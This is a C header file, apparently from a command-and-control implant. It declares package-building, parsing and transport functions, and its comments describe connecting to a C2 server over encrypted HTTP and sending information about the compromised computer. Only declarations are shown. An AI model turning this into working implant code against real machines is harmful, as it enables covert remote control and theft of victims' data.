#pragma once

#include <windows.h>

typedef struct {
    UINT32  CommandID;
    PVOID   Buffer;
    size_t  Length;
    size_t  Size;
    BOOL    Encrypt;
} PACKAGE, *PPACKAGE;

typedef struct {
    PCHAR   Original;
    PCHAR   Buffer;
    UINT32  Size;
    UINT32  Length;

    BOOL    Endian;
} PARSER, *PPARSER;

VOID   ParserNew( PPARSER parser, PVOID buffer, UINT32 size );
VOID   ParserDecrypt(    PPARSER parser, PBYTE Key, PBYTE IV );
INT16  ParserGetInt16(   PPARSER parser );
INT    ParserGetInt32(   PPARSER parser );
INT64  ParserGetInt64(   PPARSER parser );
BOOL   ParserGetBool(    PPARSER parser );
BYTE   ParserGetByte(    PPARSER parser );
PCHAR  ParserGetBytes(   PPARSER parser, PUINT32 size );
PCHAR  ParserGetString(  PPARSER parser, PUINT32 size );
PWCHAR ParserGetWString( PPARSER parser, PUINT32 size );
VOID   ParserDestroy(    PPARSER Parser );

PPACKAGE PackageCreate( UINT32 CommandID );
PPACKAGE PackageNew( VOID );

VOID PackageAddInt32( PPACKAGE package, UINT32 iData );
VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt );
VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size ); 
VOID PackageAddPad(   PPACKAGE package, PUCHAR data, SIZE_T dataSize );
VOID PackageDestroy(  PPACKAGE package );
BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size );
VOID PackageAddBool(  PPACKAGE Package, BOOLEAN Data );
VOID PackageTransmitError( UINT32 ErrNmb );
VOID PackageAddString(  PPACKAGE package, PCHAR data );
VOID PackageAddWString( PPACKAGE package, PWCHAR data );

/*!
 * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption
 * and send the collected user/computer info about the compromised Computer
 * @return Return true if functions ran successful
 */
BOOL TransportInit( );

/*!
 * Send our specified data + encrypt it with random key
 * @param Data Data we want to send
 * @param Size Size of Data we want to send
 * @return Return true if functions ran successful
 */
BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize );
